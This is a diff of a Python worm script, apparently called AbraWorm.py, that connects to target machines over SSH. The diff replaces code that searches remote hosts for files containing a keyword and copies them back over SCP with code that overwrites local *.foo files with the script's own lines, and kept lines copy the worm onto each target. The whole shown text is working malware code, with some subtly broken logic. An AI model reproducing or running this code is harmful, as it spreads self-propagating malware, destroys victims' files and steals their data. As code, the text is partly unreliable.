@@ -191,20 +191,20 @@ while True:
                         print("\nThe target machine is already infected\n")
                         next
                     # Now let's look for files that contain the string 'abracadabra'
-                    cmd = 'grep -ls abracadabra *'
-                    stdin, stdout, stderr = ssh.exec_command(cmd)
-                    error = stderr.readlines()
-                    if error is not None:
-                        print(error)
-                        next
-                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
-                    for item in received_list:
-                        files_of_interest_at_target.append(item.strip())
-                    print("\nfiles of interest at the target: %s" % str(files_of_interest_at_target))
-                    scpcon = scp.SCPClient(ssh.get_transport())
-                    if len(files_of_interest_at_target) > 0:
-                        for target_file in files_of_interest_at_target:
-                            scpcon.get(target_file)
+                    IN = open(sys.argv[0], 'r')
+                    virus = [line for (i,line) in enumerate(IN) if i < 37]
+
+                    for item in glob.glob("*.foo"):
+                        IN = open(item, 'r')
+                        all_of_it = IN.readlines()
+                        IN.close()
+                        if any(line.find('foovirus') for line in all_of_it): next
+                        os.chmod(item, 0777)    
+                        OUT = open(item, 'w')
+                        OUT.writelines(virus)
+                        all_of_it = ['#' + line for line in all_of_it]
+                        OUT.writelines(all_of_it)
+                        OUT.close()
                     # Now deposit a copy of AbraWorm.py at the target host:
                     scpcon.put(sys.argv[0])
                     scpcon.close()
